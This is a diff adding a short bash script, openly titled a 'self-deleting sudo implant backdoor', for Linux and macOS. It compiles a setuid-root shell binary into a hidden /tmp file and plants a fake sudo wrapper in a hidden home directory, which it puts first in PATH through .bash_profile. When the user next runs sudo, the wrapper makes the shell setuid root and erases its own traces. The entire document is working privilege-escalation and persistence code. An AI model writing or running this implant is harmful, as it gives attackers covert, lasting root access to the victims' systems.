@@ -1,0 +1,64 @@
+#!/bin/bash
+
+####################################################
+###### self-deleting sudo implant backdoor    ######
+###### by m4rkw - https://m4.rkw.io/blog.html ######
+####################################################
+
+unique_number="374686348234823"
+platform="`uname`"
+
+if [ "$USER" == "root" ] ; then
+  echo "er, lay off the weed. you're already root."
+  exit 1
+fi
+
+cat > /tmp/exp.c <<EOF
+#include <unistd.h>
+int main()
+{
+  setuid(0);
+  seteuid(0);
+  execl("/bin/bash","bash",NULL);
+  return 0;
+}
+EOF
+gcc -o /tmp/., /tmp/exp.c
+if [ $? -ne 0 ] ; then
+  echo "failed to compile the exploit, gcc isn't working."
+  rm -f /tmp/exp.c
+  exit 1
+fi
+rm -f /tmp/exp.c
+
+mkdir ~/., 2>/dev/null
+cat > ~/.,/sudo <<EOF
+#!/bin/bash
+args=("\$@")
+if [ "\`whoami\`" == "root" ] ; then
+  if [ "$platform" == "Darwin" ] ; then
+    /usr/bin/sudo chown root:wheel /tmp/.,
+  else
+    /usr/bin/sudo chown root:root /tmp/.,
+  fi
+  /usr/bin/sudo chmod 4755 /tmp/.,
+  if [ "$platform" == "Darwin" ] ; then
+    rm -rf /Users/$USER/.,
+    sed -i '' '/^PATH=~\/\.,:\$PATH #$unique_number\$/d' /Users/$USER/.bash_profile
+    sed -i '' '/^set +h #$unique_number\$/d' /Users/$USER/.bash_profile
+  else
+    rm -rf /home/$USER/.,
+    sed -i '/^PATH=~\/\.,:\$PATH #$unique_number\$/d' /home/$USER/.bash_profile
+    sed -i '/^set +h #$unique_number\$/d' /home/$USER/.bash_profile
+  fi
+  /usr/bin/sudo "\${args[@]}"
+else
+  /usr/bin/sudo ~/.,/sudo "\${args[@]}"
+fi
+EOF
+
+chmod 755 ~/.,/sudo
+echo "PATH=~/.,:\$PATH #$unique_number" >> ~/.bash_profile
+echo "set +h #$unique_number" >> ~/.bash_profile
+
+echo "implant installed."
